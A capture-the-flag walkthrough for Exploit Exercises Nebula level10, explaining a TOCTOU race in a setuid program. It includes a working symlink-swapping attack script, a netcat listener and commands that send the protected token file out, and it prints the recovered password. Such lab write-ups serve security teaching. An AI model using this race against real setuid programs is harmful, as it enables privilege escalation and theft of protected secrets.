# [Level10](https://exploit-exercises.com/nebula/level10/)

This is a [TOCTOU](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use) bug. 

First create an attack script at `/tmp/attack.sh`:

```bash
#!/bin/bash

touch /tmp/input0
touch /tmp/input1

while true; do
  ln -fs /home/flag10/token /tmp/input0 # Link input0 -> token (we cannot access token).
  ln -fs /tmp/input1 /tmp/input0        # Link input0 -> input1 (we can access input1).
done
```

Next run the attack script in the background:

```bash
chmod +x attack.sh
/tmp/attack.sh &
```

In a different terminal do:

```bash
nc -lv 18211
```

In the original terminal do:

```bash
/home/flag10/flag10 /tmp/input0 [IPADDRESS]
```

You may need to run this a couple times to make sure the symlinks are correct for when `access` and `open` are called. 
You want the `input0 -> input1` symlink when `access` is called, and the `input0 -> token` symlink for when `open` is called.

Onces you get the password `615a2ce1-b2b5-4c76-8eed-8aa5c4015c27`, log into the `flag10` account and do:

```bash
getflag
```
